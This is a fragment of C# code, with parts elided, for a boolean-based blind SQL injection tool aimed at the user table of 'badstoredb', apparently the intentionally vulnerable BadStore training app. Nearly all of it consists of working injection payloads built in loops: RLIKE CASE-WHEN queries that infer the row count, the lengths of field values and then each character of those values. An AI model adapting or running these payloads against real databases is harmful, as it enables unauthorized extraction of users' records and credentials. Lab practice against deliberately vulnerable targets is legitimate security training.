...
//
			int countLength = 0;
			for (;;countLength++) {
				string getCountLength = "Snake Oil' RLIKE (SELECT (CASE WHEN ((SELECT LENGTH(IFNULL(CAST(COUNT(*) AS CHAR),0x20)) FROM badstoredb.userdb)>"+countLength+") THEN 0x66647361 ELSE 0x28 END)) AND 'LeSo'='LeSo";
			...
			for (int i = 1; i <= countLength; i++) {
				for (int c = 48; c <= 58; c++) { 
					string getCount = "Snake Oil' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM badstoredb.userdb)," + i + ",1))>"+c+") THEN 0x66647361 ELSE 0x28 END)) AND 'LeSo'='LeSo";
		...
		private static int GetLength(string host, int row, string column) {
			int countLength = 0;
			for (;; countLength++) {
				string getCountLength = "Snake Oil' RLIKE (SELECT (CASE WHEN ((SELECT LENGTH(IFNULL(CAST(CHAR_LENGTH("+column+") AS CHAR),0x20)) FROM badstoredb.userdb ORDER BY email LIMIT "+row+",1)>"+countLength+") THEN 0x66647361 ELSE 0x28 END)) AND 'YIye'='YIye";
			...
			for (int i = 1; i <= countLength; i++) {
				for (int c = 48; c <= 58; c++) {
					string getLength = "Snake Oil' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(" + column + ") AS CHAR),0x20) FROM badstoredb.userdb ORDER BY email LIMIT " + row + ",1)," + i + ",1))>"+c+") THEN 0x66647361 ELSE 0x28 END)) AND 'YIye'='YIye";
		...
		private static string GetValue(string host, int row, string column, int length) {
			...
			for (int i = 1; i <= length; i++) {
				for (int c = 32; c <= 126; c++) {
					string getChar = "Snake Oil' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST("+column+" AS CHAR),0x20) FROM badstoredb.userdb ORDER BY email LIMIT "+row+",1),"+i+",1))>"+c+") THEN 0x66647361 ELSE 0x28 END)) AND 'YIye'='YIye";
